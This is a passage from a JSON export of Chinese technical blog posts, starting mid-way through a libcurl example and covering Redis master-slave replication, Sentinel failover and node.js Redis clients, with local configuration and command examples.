</span>   <span style=\"color: #99cc99;\">return</span> 1;\n<span class=\"linenr\">60: </span>}\n</pre>\n</div>\n\n<p>\n上面的示例代码要注意的地方：\n</p>\n\n<dl class=\"org-dl\">\n<dt> 行 <a href=\"#coderef-curl_write_function_buffer\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_write_function_buffer');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_write_function_buffer');\">16</a> </dt><dd>buffer不是 <code>\\0</code> 结尾的\n</dd>\n\n<dt> 行 <a href=\"#coderef-curl_write_function_return\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_write_function_return');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_write_function_return');\">17</a> </dt><dd>总是返回 <code>size*nmemb</code>\n</dd>\n\n<dt> 行 <a href=\"#coderef-curl_nosignal\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_nosignal');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_nosignal');\">38</a> </dt><dd>总是设置这个选项\n\n<p>\n<code>libcurl</code> 不支持异步 <code>dns</code> 解析时，会通过 <code>signal</code> 的方式实现 <code>dns</code> 解析设置超时， <code>signal</code> 会导致多线程程序崩溃，后台服务通常都是多线程的，所以应该总是设置这个选项（但是 <code>libcurl</code> 不支持异步 <code>dns</code> 解析时，超时选项将被忽略）。\n</p>\n\n<p>\n可以通过运行 <code>curl --version</code> 命令或调用 <code>curl_version</code> 函数查看 <code>libcurl</code> 是否支持异步 <code>dns</code> 解析，调用 <code>curl_version_info</code> 函数还可以获得具体的 <code>c-ares</code> 库版本号。\n</p>\n\n<p>\n编译 <code>libcurl</code> 时，通过为  <code>configure</code> 指定 <code>--enable-threaded-resolver</code> 或 <code>--enable-ares</code> 选项启用异步 <code>dns</code> 解析。\n</p>\n</dd>\n\n<dt> 行 <a href=\"#coderef-curl_response_code\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-curl_response_code');\" onmouseout=\"CodeHighlightOff(this, 'coderef-curl_response_code');\">44</a> </dt><dd>状态响应码变量必须是 <code>long</code> 类型\n\n<p>\n否则会由于内存越界导致程序崩溃。</p>\n</dd>\n</dl>\n"
},
{
  "title": "redis高可用性基础：Master-Slave",
  "timestamp": "2015-12-25 21:19:00",
  "tags": [
    "redis"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">理解Master-Slave</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<code>Master-Slave</code> 常常翻译为 <code>主/备</code> ，是一种高可用性（ <a href=\"https://en.wikipedia.org/wiki/High_availability\">High Availability</a> ）方案。\n</p>\n\n<p>\n举个生活中的 <code>Master-Slave</code> 例子：\n</p>\n\n<blockquote>\n<p>\n参加考试的时候，我们会准备两支钢笔，正常情况下我们只会使用一支，出问题了才会换另外一支。\n</p>\n</blockquote>\n\n<p>\n所以实施 <code>Master-Slave</code> 是有成本的，至少会有 <code>50%</code> 的资源浪费（多备几支浪费会更多），可以让 <code>Slave</code> 承担一部分工作来充分利用资源。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Redis的Master-Slave</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n关于 <code>Redis</code> 的 <code>Master-Slave</code> ，《<a href=\"http://redis.io/topics/replication\">Replication – Redis</a>》 有详尽描述。\n</p>\n\n<p>\n需要注意的是 <code>Redis</code> 的 <code>Master-Slave</code> 不能保证绝对不丢数据，而是丢失一小段时间内（如：1秒钟）的数据。\n</p>\n\n<p>\n下面开始 <code>Redis</code> 的 <code>Master-Slave</code> 实践，使用的 <code>redis</code> 版本为 <code>3.0.6</code> 。\n</p>\n</div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">创建Master结点</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<ul class=\"org-ul\">\n<li>redis配置文件\n\n<p>\n从 <code>/etc/redis.conf</code> 拷贝一份进行修改，无关的配置项已去掉，使用默认值即可。\n</p>\n\n<p>\n<a href=\"../static/redis-master.conf\">redis-master.conf</a>\n</p>\n</li>\n\n<li>在终端 <code>1</code> 启动 <code>Master</code> 结点\n\n<p>\n<code>redis-server ./redis-master.conf</code>\n</p>\n</li>\n\n<li>使用 <code>redis-cli</code> 连接 <code>Master</code>\n\n<pre class=\"example\">\n$ redis-cli -p 6379\n127.0.0.1:6379&gt;\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">创建Slave结点</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<ul class=\"org-ul\">\n<li>redis配置文件\n\n<p>\n从 <code>redis-master.conf</code> 拷贝一份进行修改，主要是修改监听的端口号（ <code>6380</code> ）、PID文件名、DB文件名，\n</p>\n\n<p>\n最关键的是设置为 <code>Master</code> 的 <code>Slave</code> <code>slaveof 127.0.0.1 6379</code> 。\n</p>\n\n<p>\n<a href=\"../static/redis-slave.conf\">redis-slave.conf</a>\n</p>\n</li>\n\n<li>在终端 <code>2</code> 启动 <code>Slave</code> 结点\n\n<p>\n<code>redis-server ./redis-slave.conf</code>\n</p>\n</li>\n\n<li>使用 <code>redis-cli</code> 连接 <code>Slave</code>\n\n<pre class=\"example\">\n$ redis-cli -p 6380\n127.0.0.1:6380&gt;\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">演示Master写Slave读的场景</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<ul class=\"org-ul\">\n<li>在 <code>Master</code> 写入\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; set hello world\nOK\n</pre>\n</li>\n\n<li>从 <code>Slave</code> 读取\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; get hello\n\"world\"\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">演示Slave挂掉的场景</h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<ul class=\"org-ul\">\n<li>关闭 <code>Slave</code> \n\n<pre class=\"example\">\n127.0.0.1:6380&gt; shutdown\nnot connected&gt;\n</pre>\n\n<p>\n终端 <code>2</code> 上的 <code>redis-server</code> 会自动退出，注意到它退出前进行了存盘。\n</p>\n</li>\n\n<li>在 <code>Master</code> 写入\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; set hello redis\nOK\n</pre>\n</li>\n\n<li>在终端 <code>2</code> 上再次启动 <code>Slave</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-server ./redis-slave.conf\n</pre>\n</div>\n\n<p>\n从日志上可以看到 <code>Slave</code> 从 <code>Master</code> 重新进行了数据同步。\n</p>\n</li>\n\n<li>在 <code>Slave</code> 上读取\n\n<pre class=\"example\">\nnot connected&gt; get hello\n\"redis\"\n127.0.0.1:6380&gt;\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-5\" class=\"outline-3\">\n<h3 id=\"sec-2-5\">演示Master挂掉的场景</h3>\n<div class=\"outline-text-3\" id=\"text-2-5\">\n<ul class=\"org-ul\">\n<li>关闭 <code>Master</code>\n\n<pre class=\"example\">\n127.0.0.1:6379&gt; shutdown\nnot connected&gt;\n</pre>\n\n<p>\n终端 <code>1</code> 上的 <code>redis-server</code> 会自动退出，注意到它退出前进行了存盘， 终端 <code>2</code> 上的 <code>Slave</code> 在不断尝试重连 <code>Master</code> 。\n</p>\n</li>\n\n<li>Master-Slave角色切换\n\n<p>\n将运行中的原 <code>Slave</code> 提升为新 <code>Master</code>\n</p>\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; slaveof no one\nOK\n</pre>\n\n<p>\n修改原 <code>Slave</code> 的配置文件 <code>redis-slave.conf</code> 删除配置 <code>#slaveof 127.0.0.1 6379</code>\n</p>\n\n<p>\n修改原 <code>Master</code> 的配置文件 <code>redis-master.conf</code> 添加配置 <code>slaveof 127.0.0.1 6380</code>\n</p>\n</li>\n\n<li>在新 <code>Master</code> 写入\n\n<pre class=\"example\">\n127.0.0.1:6380&gt; set hello master-slave\nOK\n</pre>\n</li>\n\n<li>在终端 <code>1</code> 上再次启动原 <code>Master</code> \n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">redis-server ./redis-master.conf\n</pre>\n</div>\n\n<p>\n从日志上可以看到它现在是 <code>Slave</code> 角色了，反而从原 <code>Slave</code> 同步数据。\n</p>\n</li>\n\n<li>在原 <code>Master</code> 上读取\n\n<pre class=\"example\">\nnot connected&gt; get hello\n\"master-slave\"\n127.0.0.1:6379&gt;\n</pre>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-6\" class=\"outline-3\">\n<h3 id=\"sec-2-6\">总结</h3>\n<div class=\"outline-text-3\" id=\"text-2-6\">\n<p>\n<code>Redis</code> 的 <code>Master-Slave</code> 是一种动态关系，角色（ <code>Master</code> 、 <code>Slave</code> ）会互相转换，角色转换过程中必须严格按照步骤来，操作不当可能导致数据丢失。\n</p>\n\n<p>\n后面会发文介绍自动进行这种切换的工具 <code>Redis Sentinel</code> ，以及当 <code>Master-Slave</code> 发生切换后，应用程序该如何重连到新的 <code>Master</code> 。\n</p>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://en.wikipedia.org/wiki/Master/slave_(technology)\">Master/slave (technology) - Wikipedia, the free encyclopedia</a>\n</p>\n\n<p>\n<a href=\"http://redis.io/topics/replication\">Replication – Redis</a>\n</p>\n\n<p>\n<a href=\"http://www.tuicool.com/articles/2QbABj\">Redis slave切换为master操作（不停机） - 推酷</a></p>\n</div>\n</div>\n"
},
{
  "title": "redis高可用性方案：Sentinel",
  "timestamp": "2015-12-26 22:54:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n在前面一篇文章《 <a href=\"http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis高可用性基础：Master-Slave</a> 》中，主备切换过程时有好几个步骤，需要人工介入，这势必增加服务的故障时间（Down Time）。\n</p>\n\n<p>\n而 <code>Sentinel</code> 正是自动化这一过程的官方工具，详细文档请参考《<a href=\"http://redis.io/topics/sentinel\">Redis Sentinel Documentation – Redis</a>》。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><code>Sentinel</code> 的功能</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>监控\n\n<p>\n<code>Sentinel</code> 不断地检测 <code>Master</code> 和 <code>Slave</code> 实例的运行状态。\n</p>\n</li>\n\n<li>通知\n\n<p>\n<code>Sentinel</code> 通过API，能够通知系统管理员、其它程序：监控的Redis实例出问题了。\n</p>\n</li>\n\n<li>自动故障切换\n\n<p>\n如果 <code>Master</code> 实例出问题了， <code>Sentinel</code> 通过将一个 <code>Slave</code> 实例提升为 <code>Master</code> 修复故障，其它 <code>Slave</code> 实例使用新的 <code>Master</code> 实例，同时通知给使用Redis服务的应用程序以便重新建立连接。\n</p>\n</li>\n\n<li>配置提供者\n\n<p>\n<code>Sentinel</code> 做为客户端服务发现的权威来源：客户端连接到 <code>Sentinel</code> 以获取当前 <code>Master</code> 的地址，故障切换后报告新的地址。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><code>Sentinel</code> 演示</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n<code>Redis Sentinel</code> 推荐的配置为至少三个Sentinel部署在三台不同的机器上，只配一台自已本身就是单点没有意义，二台时可能出现“脑裂”。\n</p>\n\n<ul class=\"org-ul\">\n<li>启动上一篇文章《 <a href=\"http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis高可用性基础：Master-Slave</a> 》配置好的 <code>Master</code> 及 <code>Slave</code> Redis实例\n\n<p>\n<code>Master</code> 监听在 <code>6379</code> 端口， <code>Slave</code> 监听在 <code>6380</code> 端口。\n</p>\n</li>\n\n<li>使用端口号 <code>5000</code> <code>5001</code> <code>5002</code> 创建三个 <code>Sentinel</code> 实例\n\n<p>\n<code>Sentinel</code> 实例 <code>a</code> 的配置文件 <code>redis-sentinel-a.conf</code>\n</p>\n\n<pre class=\"example\">\nport 5000\nsentinel monitor mymaster 127.0.0.1 6379 2\nsentinel down-after-milliseconds mymaster 5000\nsentinel failover-timeout mymaster 60000\nsentinel parallel-syncs mymaster 1\n</pre>\n\n<p>\n其它两个 <code>Sentinel</code> 实例 <code>b</code> <code>c</code> 配置和 <code>a</code> 基本一样，只是端口号分别为 <code>5001</code> 和 <code>5002</code> ：\n</p>\n\n<p>\n<a href=\"../static/redis-sentinel-a.conf\">redis-sentinel-a.conf</a>\n</p>\n\n<p>\n<a href=\"../static/redis-sentinel-b.conf\">redis-sentinel-b.conf</a>\n</p>\n\n<p>\n<a href=\"../static/redis-sentinel-c.conf\">redis-sentinel-c.conf</a>\n</p>\n\n<p>\n终端 <code>3</code> 启动 <code>Sentinel a</code> <code>redis-sentinel ./redis-sentinel-a.conf</code>\n</p>\n\n<p>\n终端 <code>4</code> 启动 <code>Sentinel b</code> <code>redis-sentinel ./redis-sentinel-b.conf</code>\n</p>\n\n<p>\n终端 <code>5</code> 启动 <code>Sentinel c</code> <code>redis-sentinel ./redis-sentinel-c.conf</code>\n</p>\n\n<p>\n可以发现当 <code>Sentinel</code> 实例启动时 <code>Sentinel</code> 的配置文件会自动进行更新，记录 <code>Slave</code> 及其它 <code>Sentinel</code> 的信息。\n</p>\n</li>\n\n<li>从 <code>Sentinel</code> 获取当前 <code>Master</code> 的地址\n\n<p>\n通过 <code>redis-cli</code> 连上任一 <code>Sentinel</code> <code>redis-cli -p 5000</code>\n</p>\n\n<pre class=\"example\">\n127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster\n1) \"127.0.0.1\"\n2) \"6379\"\n</pre>\n</li>\n\n<li>故障切换测试\n\n<p>\n让 <code>Master</code> 停止响应 <code>30</code> 秒 <code>redis-cli -p 6379 debug sleep 30</code>\n</p>\n\n<p>\n约 <code>10</code> 秒钟后，通过 <code>Sentinel</code> 的日志输出看到发生了主从切换。\n</p>\n\n<p>\n重新获取当前的 <code>Master</code>\n</p>\n\n<pre class=\"example\">\n127.0.0.1:5000&gt; sentinel get-master-addr-by-name mymaster\n1) \"127.0.0.1\"\n2) \"6380\"\n</pre>\n\n<p>\n<code>Redis</code> 实例的配置文件被自动修正，以反映新的 <code>Master-Slave</code> 状态：\n</p>\n\n<p>\n<code>redis-master.conf</code> 添加了配置行 <code>slaveof 127.0.0.1 6380</code>\n</p>\n\n<p>\n<code>redis-slave.conf</code> 删除了配置行 <code>slaveof 127.0.0.1 6379</code>\n</p>\n\n<p>\n和我们在上一篇文章《 <a href=\"http://blog.kankanan.com/article/redis-9ad853ef7528602757fa7840ff1a-master-slave.html\">redis高可用性基础：Master-Slave</a> 》手工做的主备切换如出一辙。\n</p>\n\n<p>\n三个 <code>Sentinel</code> 配置文件中的 <code>Master-Slave</code> 配置也被自动修正。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">疑问</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li><code>Redis</code> 实例的配置文件是被谁修改的？\n\n<p>\n如果是 <code>Sentinel</code> 那么就意味着所有 <code>Redis</code> 实例的同一机器上必须配置有 <code>Sentinel</code> （《<a href=\"http://redis.io/topics/sentinel\">Redis Sentinel Documentation – Redis</a>》未提及）。\n</p>\n</li>\n\n<li>万一因为某种原因，原 <code>Master</code> 配置文件未改为 <code>Slave</code> ，会不会出现脑裂？\n\n<p>\n感觉应该是会出现脑裂的，但是只要客户端应用总是使用 <code>Sentinel</code> 提供的 <code>Master</code> 地址，就不会有问题。\n</p>\n\n<p>\n<code>node.js</code> 访问单个 <code>redis</code> 实例已经用得很溜了，下一篇文章会研究 <code>node.js</code> 访问 <code>redis sentinel</code> ，相信答案就会水落石出了。\n</p>\n</li>\n\n<li><code>Redis Sentinel</code> 能保证不丢数据吗？\n\n<p>\n不能。由于 <code>Redis</code> 是异步复制，没有办法防止数据丢失，假设配置如下：\n</p>\n\n<pre class=\"example\">\nmin-slaves-to-write 1\nmin-slaves-max-lag 10\n</pre>\n\n<p>\n假设出现了分裂（partition）， <code>Master</code> 要 <code>10</code> 秒钟后才发现 <code>Slave</code> 失联再禁止写入，当分裂消除（partition heals）， 旧 <code>Master</code> 做为 <code>Slave</code> 连上新的 <code>Master</code> ，这 <code>10</code> 秒钟内写入的数据不会合入（merge）新的 <code>Master</code> ，数据丢失了。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n<a href=\"http://redis.io/topics/sentinel\">Redis Sentinel Documentation – Redis</a></p>\n</div>\n</div>\n"
},
{
  "title": "node.js连接redis高可用性方案：Sentinel",
  "timestamp": "2015-12-27 14:27:00",
  "tags": [
    "redis",
    "node"
  ],
  "body": "<p>\nnode.js后台应用在开始时往往不会搞得太复杂，使用单实例的redis，一般都会使用官方推荐的模块 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">访问单实例node.js</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n在 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 的基础上稍作封装，主要是避免并行访问时意外创建多个redis连接。\n</p>\n</div>\n\n<div id=\"outline-container-sec-1-1\" class=\"outline-3\">\n<h3 id=\"sec-1-1\">database.js</h3>\n<div class=\"outline-text-3\" id=\"text-1-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">redis</span> = require(<span style=\"color: #66cccc;\">'redis'</span>);\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">Database</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_host = <span style=\"color: #66cccc;\">'127.0.0.1'</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_port = 6379;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_db = 2;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis = <span style=\"color: #6699cc;\">null</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_selected = <span style=\"color: #6699cc;\">false</span>;\n}\n\nDatabase.<span style=\"color: #6699cc;\">prototype</span>.redis = <span style=\"color: #99cc99;\">function</span>(<span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (self._redis &amp;&amp; self._redis_selected) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, self._redis);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (! self._redis) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis = redis.createClient(self._redis_port, self._redis_host);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis.select(self._redis_db, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_selected = <span style=\"color: #6699cc;\">true</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, self._redis);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n};\n\n\nmodule.exports = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Database</span>();\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-1-2\" class=\"outline-3\">\n<h3 id=\"sec-1-2\">client.js</h3>\n<div class=\"outline-text-3\" id=\"text-1-2\">\n<p>\n使用 <code>database.js</code>\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">db</span> = require(<span style=\"color: #66cccc;\">'./database'</span>);\n\ndb.redis(<span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">client</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(err.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> process.exit(1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.set(<span style=\"color: #66cccc;\">'hello'</span>, <span style=\"color: #66cccc;\">'world'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(err.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> process.exit(1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   setTimeout(<span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.get(<span style=\"color: #66cccc;\">'hello'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>, <span style=\"color: #ffcc66;\">value</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.error(err.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> process.exit(1);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">'hello: '</span> + value);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.exit(0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }, 20*1000);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n});\n</pre>\n</div>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">访问主备Redis</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n但是随着服务的成功，用户量开始增加，另外对稳定性、可靠性有了一定要求，确保数据的安全性成了重中之重，redis由单机转向主/备（Replication）甚至集群（Cluster），\n本文只关注使用 <code>Sentinel</code> 管理的主/备（Replication）Redis。\n</p>\n\n<p>\n这就意味着Redis客户端应用不能直接连接Redis实例，而是需要先连接 <code>Sentinel</code> ，根据 <code>Sentinel</code> 提供的 <code>Master</code> 或 <code>Slave</code> 地址连接Redis实例，\n还要接收 <code>Sentinel</code> 的 <code>Master</code> <code>Slave</code> 变动通知，重连Redis实例。\n</p>\n\n<p>\n不幸的是，<a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 模块只支持单实例redis，基于 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 实现与 <code>Sentinel</code> 的交互工作量比较大。\n</p>\n\n<p>\n所幸的是 <a href=\"http://github.com/luin/ioredis/\">ioredis</a> （现已成为redis官方推荐模块）出现了，它支持 <code>Sentinel</code> ，而且大部分API跟 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 是兼容的:\n</p>\n\n<blockquote>\n<p>\nioredis is a robust, full-featured Redis client that is used in the world's biggest online commerce company Alibaba and many other awesome companies.\n</p>\n\n<ol class=\"org-ol\">\n<li>Full-featured. It supports Cluster, Sentinel, Pipelining and of course Lua scripting &amp; Pub/Sub (with the support of binary messages).\n</li>\n<li>High performance.\n</li>\n<li>Delightful API. It works with Node callbacks and Bluebird promises.\n</li>\n<li>Transformation of command arguments and replies.\n</li>\n<li>Transparent key prefixing.\n</li>\n<li>Abstraction for Lua scripting, allowing you to define custom commands.\n</li>\n<li>Support for binary data.\n</li>\n<li>Support for TLS.\n</li>\n<li>Support for offline queue and ready checking.\n</li>\n<li>Support for ES6 types, such as Map and Set.\n</li>\n<li>Support for GEO commands (Redis 3.2 Unstable).\n</li>\n<li>Sophisticated error handling strategy.\n</li>\n</ol>\n</blockquote>\n\n<p>\n<a href=\"http://github.com/luin/ioredis/\">ioredis</a> 提供了从 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 进行迁移的文档 <a href=\"https://github.com/luin/ioredis/wiki/Migrating-from-node_redis\">Migrating from node_redis</a> 。\n</p>\n\n<p>\n但也要注意 <a href=\"http://github.com/luin/ioredis/\">ioredis</a> 的不同之处，如连接 <code>Redis</code> 失败时， <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 默认是不重连，而 <a href=\"http://github.com/luin/ioredis/\">ioredis</a> 会重连，在 <code>redis</code> 故障时可能导致 <code>node.js</code> 积压大量请求耗尽内存。\n</p>\n\n<p>\n参考文档 <a href=\"https://github.com/luin/ioredis/blob/master/README.md#sentinel\">ioredis Sentinel</a> 